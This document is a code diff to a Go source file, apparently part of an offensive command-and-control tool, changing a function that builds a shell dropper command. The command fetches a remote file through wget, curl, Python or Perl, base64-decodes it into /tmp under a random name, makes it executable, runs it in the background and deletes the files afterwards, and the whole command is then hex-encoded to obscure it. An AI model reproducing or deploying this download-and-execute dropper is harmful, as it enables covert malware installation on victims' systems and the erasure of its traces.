@@ -1,6 +1,3 @@
-//go:build linux
-// +build linux
-
 package cc
 
 import (
@@ -19,11 +16,16 @@ func bash_http_downloader(url string) []byte {
 	cmd := `d() {
 wget -q "$1" -O-||curl -fksL "$1"||python -c "import urllib;u=urllib.urlopen('${1}');print(u.read());"||python -c "import urllib.request;import sys;u=urllib.request.urlopen('$1');sys.stdout.buffer.write(u.read());"||perl -e "use LWP::Simple;\$resp=get(\"${1}\");print(\$resp);"
 }
-d '%s'>/tmp/%s&&chmod +x /tmp/%s&&/tmp/%s`
+d '%s'>/tmp/%s&&base64 -d </tmp/%s>/tmp/%s
+chmod +x /tmp/%s
+/tmp/%s&
+rm -f /tmp/%s*`
 	dropper_name := util.RandStr(22)
+	temp_name := dropper_name[:2]
 
-	payload := fmt.Sprintf(cmd, url,
-		dropper_name, dropper_name, dropper_name)
+	payload := fmt.Sprintf(cmd,
+		url,
+		temp_name, temp_name, dropper_name, dropper_name, dropper_name, temp_name)
 
 	// hex encoded payload
 	payload = util.HexEncode(payload)
